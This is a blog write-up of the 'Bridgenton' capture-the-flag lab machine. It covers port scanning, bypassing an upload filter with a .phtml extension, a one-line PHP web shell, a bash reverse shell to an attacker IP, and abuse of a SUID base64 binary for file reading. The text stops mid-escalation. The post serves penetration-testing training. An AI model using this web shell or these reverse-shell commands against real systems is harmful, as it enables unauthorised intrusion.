<!doctype html><html lang=en><head><title>THL Bridgenton WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="TheHackersLabs 'Bridgenton' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="THL Bridgenton WriteUp"><meta name=twitter:description content="TheHackersLabs 'Bridgenton' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/bridgenton/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="THL Bridgenton WriteUp"><meta property="og:description" content="TheHackersLabs 'Bridgenton' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-03T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-03T00:00:00+00:00"><meta property="article:tag" content="THL"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Php"><meta property="article:tag" content="File Upload"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/bridgenton/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/bridgenton/>THL Bridgenton WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2023-10-03T00:00:00Z>3 October, 2023
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
14-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/thl/>THL</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/php/>Php</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/file-upload/>File Upload</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/library-hijacking/>Library Hijacking</a></span></div></div></header><div class=post-content><h1 id=bridgenton----thehackerslabs>Bridgenton &ndash; TheHackersLabs
<a class=heading-link href=#bridgenton----thehackerslabs><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>TheHackersLabs</em></li></ul><p><img alt="&lsquo;Bridgenton&rsquo; Avatar" src=/pentesting/images/Bridgenton_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Bridgenton</code> is an easy/medium box from <code>TheHackersLabs</code> platform.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Starting a scan with <code>Nmap</code> shows 2 ports open: <code>22</code> <code>SSH</code> and <code>80</code> <code>HTTP</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS --open -p- --min-rate=5000 -n -Pn -vvv 10.20.1.125 -oG allPorts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 18:58 -04
</span></span></span><span class=line><span class=cl><span class=go>Initiating ARP Ping Scan at 18:58
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.125 [1 port]
</span></span></span><span class=line><span class=cl><span class=go>Completed ARP Ping Scan at 18:58, 0.08s elapsed (1 total hosts)
</span></span></span><span class=line><span class=cl><span class=go>Initiating SYN Stealth Scan at 18:58
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.125 [65535 ports]
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 22/tcp on 10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 80/tcp on 10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>Completed SYN Stealth Scan at 18:58, 2.54s elapsed (65535 total ports)
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>Host is up, received arp-response (0.00055s latency).
</span></span></span><span class=line><span class=cl><span class=go>Scanned at 2024-09-02 18:58:54 -04 for 2s
</span></span></span><span class=line><span class=cl><span class=go>Not shown: 65533 closed tcp ports (reset)
</span></span></span><span class=line><span class=cl><span class=go>PORT   STATE SERVICE REASON
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:8D:CA:AA (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Read data files from: /usr/bin/../share/nmap
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds
</span></span></span><span class=line><span class=cl><span class=go>           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
</span></span></span></code></pre></div><ul><li>And checking their versions:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.20.1.125 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 18:59 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.00080s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 ad:fa:fa:1a:e7:99:65:1b:f9:e9:c4:55:be:f5:3a:f3 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 d7:87:d7:2e:d9:a3:4e:87:87:3d:b9:b8:ba:89:b5:fd (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    Apache httpd 2.4.57 ((Debian))
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.57 (Debian)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Universidad Bridgenton
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:8D:CA:AA (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds
</span></span></span></code></pre></div><p>does not show much info.</p><ul><li><p>Visiting the <code>HTTP</code> site of the victim machine (<code>http://10.20.1.125</code> in my case) shows a university portal webpage:
!<code>Bridgenton_1.png</code>
Many buttons in this page do not work. However, the ones at the top middle do.</p></li><li><p><code>Admisiones</code> button allows us to create an account. Clicking on it redirects to <code>/registro.php</code>. Now we can see:
!<code>Bridgenton_2.png</code></p></li><li><p>If I try to create a user, it asks to upload an image. So we simply upload a generic <code>.png</code> image:
!<code>Bridgenton_3.png</code></p></li><li><p>But when we attempt to register, we get an error:
!<code>Bridgenton_4.png</code></p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Error: Solo se permite cargar archivos con extensi√≥n .jpg, .jpeg, .png. Por favor, carga un archivo con una extensi√≥n v√°lida.
</span></span></code></pre></div><p>Basically, it says it is an invalid extension even when it is a valid <code>.png</code> file.</p><ul><li>Since the path to register was <code>/registro.php</code>, this could mean that the server is running <code>PHP</code> and, therefore, we can attempt to upload a malicious <code>PHP</code> file. We can get a list from <a href=https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology class=external-link target=_blank rel=noopener>HackTricks</a> or <a href=https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass class=external-link target=_blank rel=noopener>this blog</a> (they are basically the same) and save them into a file that I will call <code>php_extensions_list.txt</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat php_extensions_list.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>.php
</span></span></span><span class=line><span class=cl><span class=go>.php2
</span></span></span><span class=line><span class=cl><span class=go>.php3
</span></span></span><span class=line><span class=cl><span class=go>.php4
</span></span></span><span class=line><span class=cl><span class=go>.php5
</span></span></span><span class=line><span class=cl><span class=go>.php6
</span></span></span><span class=line><span class=cl><span class=go>.php7
</span></span></span><span class=line><span class=cl><span class=go>.phps
</span></span></span><span class=line><span class=cl><span class=go>.phps
</span></span></span><span class=line><span class=cl><span class=go>.pht
</span></span></span><span class=line><span class=cl><span class=go>.phtm
</span></span></span><span class=line><span class=cl><span class=go>.phtml
</span></span></span><span class=line><span class=cl><span class=go>.pgif
</span></span></span><span class=line><span class=cl><span class=go>.shtml
</span></span></span><span class=line><span class=cl><span class=go>.htaccess
</span></span></span><span class=line><span class=cl><span class=go>.phar
</span></span></span><span class=line><span class=cl><span class=go>.inc
</span></span></span><span class=line><span class=cl><span class=go>.hphp
</span></span></span><span class=line><span class=cl><span class=go>.ctp
</span></span></span><span class=line><span class=cl><span class=go>.module
</span></span></span></code></pre></div><ul><li>What we will do next is to check what extensions might be &ldquo;accepted&rdquo; by the application. For this we open <code>Burpsuite</code> and now I will intercept the request sent to the server when we click on <code>Registrarse</code> button at <code>/registro.php</code> path. We have a request like the following:
!<code>Bridgenton_5.png</code></li><li>Now, I will right click on this request and click on <code>Send to Intruder</code>. Then, go to <code>Intruder</code> tab inside <code>Burpsuite</code>. There, go to <code>Payloads</code> tab, fo to <code>Payload settings</code> section, click on <code>Load</code> and select our generated <code>PHP</code> extensions list:
!<code>Bridgenton_6.png</code>
Additionally, at the very bottom of this tab, unselect the option <code>URL-encode these characters</code>.</li><li>Then, go to <code>Positions</code> and locate the line that is naming the file being uploaded:
!<code>Bridgenton_7.png</code>
Select the extension (<code>.png</code>) in my case and, at the right side, click on <code>Add ¬ß</code>. Now this line looks like:
!<code>Bridgenton_8.png</code></li><li>Finally, click on <code>Start attack</code> button located at the top right. Now a new windows spawn, like the following:
!<code>Bridgenton_9.png</code></li><li>If we click on <code>Lenght</code> a couple of times, now it will order the requests by its <code>Response Length</code>. We might find some request that has a different length than the others and, therefore, might be a different response:
!<code>Bridgenton_10.png</code></li><li>The request with <code>.phtml</code> extension is different than the others. Double clicking on this request, and then selecting <code>Response</code> shows something interesting:
!<code>Bridgenton_11.png</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 03 Sep 2024 23:17:25 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Apache/2.4.57 (Debian)</span>
</span></span><span class=line><span class=cl><span class=n>Vary</span><span class=o>:</span> <span class=l>Accept-Encoding</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>81</span>
</span></span><span class=line><span class=cl><span class=n>Keep-Alive</span><span class=o>:</span> <span class=l>timeout=5, max=100</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>Keep-Alive</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=UTF-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Archivo cargado con √©xito. Bienvenido, gunzf0x, te has registrado correctamente.
</span></span></code></pre></div><ul><li>This means that our file has been uploaded. Now, I will create a simple malicious <code>PHP</code> file and name it <code>image.phtml</code> with the following content:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><ul><li><p>Now, go back to the website, register again and upload our malicious file <code>image.phtml</code>, that is in fact our <code>PHP</code> malicious file:
!<code>Bridgenton_12.png</code>
Note: If we cannot see our image when we try to upload it, remember to change <code>All Supported Types</code> option to <code>All Files</code> in the <code>File Upload</code> GUI image selector.</p></li><li><p>Click on <code>Registrarse</code> and we successfully uploaded our file. But where is it located? We can then try to search for directories attempting a <code>Brute Force Directory Listing</code> with <code>Gobuster</code> using a directory dictionary from <code>SecLists</code>. For this we run:</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.20.1.125 -x php -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/login.php            (Status: 200) [Size: 2392]
</span></span></span><span class=line><span class=cl><span class=go>/uploads              (Status: 301) [Size: 312] [--&gt; http://10.20.1.125/uploads/]
</span></span></span><span class=line><span class=cl><span class=go>/.php                 (Status: 403) [Size: 276]
</span></span></span><span class=line><span class=cl><span class=go>/javascript           (Status: 301) [Size: 315] [--&gt; http://10.20.1.125/javascript/]
</span></span></span><span class=line><span class=cl><span class=go>/registrar.php        (Status: 200) [Size: 274]
</span></span></span><span class=line><span class=cl><span class=go>/registro.php         (Status: 200) [Size: 980]
</span></span></span><span class=line><span class=cl><span class=go>/.php                 (Status: 403) [Size: 276]
</span></span></span><span class=line><span class=cl><span class=go>/server-status        (Status: 403) [Size: 276]
</span></span></span><span class=line><span class=cl><span class=go>/bienvenida.php       (Status: 302) [Size: 0] [--&gt; login.php]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 441120 / 441122 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>where:</p><ul><li><code>-w</code> is the dictionary used for the fuzzing (directory searching in this case)</li><li><code>-u</code> accepts the url there to search for directories</li><li><code>-x</code> searches for files with that extension besides directories. So, for example, the search will attempt to find <code>/example</code> directory and <code>example.php</code> file.</li><li><code>-t</code> is the number of threads to use to speed up the process.
We get an interesting directory called <code>/uploads</code>. If we visit it <code>http://10.20.1.125/uploads</code> in our internet browser I can see something interesting:
!<code>Bridgenton_13.png</code>
We can then now visit <code>http://10.20.1.125/uploads/image.phtml</code> and it works (since we do not get <code>Error 404</code> or something similar indicating the page does not exist).
<em>Note</em>: There is, apparently, a <code>cronjob</code> running that removes files from <code>/uploads</code> content after some time. So ifwe check <code>/uploads</code> directory and our file is not there, we might need to re-upload it.</li><li>Now, we can trigger our webshell visiting, for example <code>http://10.20.1.125/uploads/image.phtml?cmd=id</code>. We can get exactly the same, but in our terminal using <code>cURL</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X GET -G &#39;http://10.20.1.125/uploads/image.phtml&#39; --data-urlencode &#39;cmd=id&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></span></code></pre></div><p>and it works. We have reached <code>Remote Code Execution</code>.</p><ul><li>Now we will try to get a reverse shell. For this, start a <code>netcat</code> listener on port <code>443</code> running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>and in our webshell, send to us a reverse shell running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X GET -G &#39;http://10.20.1.125/uploads/image.phtml&#39; --data-urlencode &#39;cmd=bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.20.1.110/443 0&gt;&amp;1&#34;&#39;
</span></span></span></code></pre></div><p>where <code>10.20.1.110</code> is my attacker IP address and <code>443</code> is the port I am already listening with <code>netcat</code>.</p><ul><li>In our listener we get a shell as <code>www-data</code> user:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.20.1.110] from (UNKNOWN) [10.20.1.125] 38774
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (586): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html/uploads$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>www-data
</span></span></span></code></pre></div><ul><li>After searching for some interesting info in the files of the webserver I find <code>procesar_registro.php</code> file at <code>/var/www/html</code>. We can see its content:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// Iniciar la sesi√≥n
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Verificar si se han enviado los datos del formulario
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;REQUEST_METHOD&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;POST&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Verificar que se hayan proporcionado un correo electr√≥nico y contrase√±a
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Verificar las credenciales del usuario (aqu√≠ deber√≠as agregar tu l√≥gica de verificaci√≥n)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$email</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$password</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Ejemplo b√°sico: verificar que el correo electr√≥nico sea &#34;james@thl.com&#34; y la contrase√±a sea &#34;bridgenton_200189&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nv>$email</span> <span class=o>===</span> <span class=s2>&#34;james@thl.com&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$password</span> <span class=o>===</span> <span class=s2>&#34;bridgenton_200189&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Inicio de sesi√≥n exitoso
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// Establecer el correo electr√≥nico en la sesi√≥n
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$email</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Redirigir al usuario a la p√°gina de bienvenida
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: bienvenida.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Credenciales incorrectas, mostrar un mensaje de error
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$mensajeError</span> <span class=o>=</span> <span class=s2>&#34;Credenciales incorrectas. Por favor, int√©ntalo de nuevo.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Si no se proporcionaron correo electr√≥nico o contrase√±a, mostrar un mensaje de error
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$mensajeError</span> <span class=o>=</span> <span class=s2>&#34;Por favor, proporcione un correo electr√≥nico y una contrase√±a.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Si no se enviaron datos por POST, redirigir al formulario de inicio de sesi√≥n
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: login.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Si llegamos a este punto, significa que hubo un error en el inicio de sesi√≥n
</span></span></span><span class=line><span class=cl><span class=c1>// Mostrar el mensaje de error y permitir que el usuario vuelva a intentarlo
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nv>$mensajeError</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>Basically, it only accepts the email <code>james@thl.com</code> and the password <code>bridgenton_200189</code> when we try to log in at <code>/login.php</code> from the main website. If we log in with these credentials the site shows the content of <code>bienvenidos.php</code> file, that is does not show anything interesting either.</p><ul><li>At this point I decide to search for <code>SUID</code> binaries. We can use <code>find</code> command for this:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ find / -perm -4000 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/bin/gpasswd
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/chfn
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/passwd
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/newgrp
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/base64
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/mount
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/su
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/umount
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/chsh
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/sudo
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/openssh/ssh-keysign
</span></span></span></code></pre></div><p>Among them all, <code>/usr/bin/base64</code> is not a usual one. Searching in <code>GTFOBins</code> how to use this file, we find <a href=https://gtfobins.github.io/gtfobins/base64/#suid class=external-link target=_blank rel=noopener>this</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo install -m =xs $(which base64) .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>LFILE=file_to_read
</span></span></span><span class=line><span class=cl><span class=go>./base64 &#34;$LFILE&#34; | base64 --decode
